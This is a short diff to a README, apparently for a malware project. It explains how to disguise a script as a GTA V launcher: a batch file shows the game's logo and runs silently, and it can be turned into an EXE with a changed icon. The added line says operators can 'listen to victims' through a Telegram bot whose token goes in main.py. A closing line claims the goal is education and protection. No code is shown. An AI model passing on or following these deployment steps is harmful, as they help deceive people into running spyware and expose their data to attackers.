@@ -5,6 +5,8 @@ by clicking on the bat file it will show the GTA V logo and run the script silen
 
 you can convert this gta v.BAT to an EXE file and change its shortcut's icon.
 
+after the script is run you can listen to victims in the telegram chat bot, who you put its token in main.py.
+
 the goal of this repository is to education and protection!.
 
 
